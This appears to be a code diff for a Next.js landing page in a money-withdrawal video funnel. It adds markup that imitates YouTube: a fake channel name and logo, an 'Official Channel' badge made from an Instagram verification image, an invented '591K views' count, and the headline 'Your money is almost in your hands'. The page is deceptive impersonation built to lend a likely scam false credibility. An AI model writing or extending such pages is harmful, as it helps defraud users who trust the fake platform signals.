@@ -1,14 +1,15 @@
-import Comments from "@/components/Comments";
+import CommentsV2 from "@/components/CommentsV2";
 import VSLBlackV2 from "@/components/videos/VSLBlackV2";
 import PixelV2 from "@/components/pixels/PixelV2";
+import Image from "next/image";
 //import PlacesAlert from '@/components/PlacesAlert';
 //import AlertBoxUrgente from "@/components/AlertBoxUrgente";
 import { useLayer } from '@/context/LayerProvider';
-import { useEffect, useState } from 'react';
+import { useEffect } from 'react';
 
 export default function Page6() {
   // COMPONENT STATES
-  const [visible] = useState<boolean>(false);
+  // const [visible] = useState<boolean>(false);
 
   // IMPORT CONTEXT DATA
   const userLayer = useLayer();
@@ -52,13 +53,7 @@ export default function Page6() {
   return (
     <>
       <PixelV2 />
-      <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
-        <span className="text-base sm:text-2xl font-semibold tracking-tight">
-          🚨 ATTENTION! Watch the video to the end to understand how to withdraw your available balance. ⬇️
-        </span>
-        {/*<PlacesAlert />*/}
-      </div>
-      <div className="flex items-center flex-col gap-1 relative -mt-4">
+      <div className="flex items-center flex-col gap-1 relative">
         <VSLBlackV2 />
         {/*<AlertBoxUrgente
           videoIdA={videoIdA}
@@ -67,13 +62,39 @@ export default function Page6() {
           thresholdBSeconds={702}
         />*/}
       </div>
-      {!visible && (
-        <div className="text-sm text-center p-2">
-          🔊 Check if your sound is activated
-        </div>
-      )}
       
-      <Comments />
+      {/* Video Info */}
+      <div className="flex flex-col gap-2 px-4">
+        <h2 className="text-lg font-semibold">Your money is almost in your hands — watch this step-by-step withdrawal guide</h2>
+        <p className="text-sm text-gray-600">591K views - 2 days ago</p>
+        <hr className="border-gray-200" />
+        
+        {/* Channel Info */}
+        <div className="flex items-center justify-between py-2">
+          <div className="flex items-center gap-2">
+            <Image
+              width="40"
+              height="40"
+              src="/logos/logochannel.png"
+              alt="Youtube"
+              className="rounded-full"
+            />
+            <span className="text-xl font-bold leading-none text-gray-900">YouTube</span>
+          </div>
+          <div className="flex items-center gap-1 bg-black px-2 py-1 rounded-full">
+            <Image
+              width="16"
+              height="16"
+              quality={100}
+              src="/steps/instagram-verify.png"
+              alt="Verified"
+            />
+            <span className="text-xs font-medium text-white">Official Channel</span>
+          </div>
+        </div>
+      </div>
+      
+      <CommentsV2 />
     </>
   );
 }
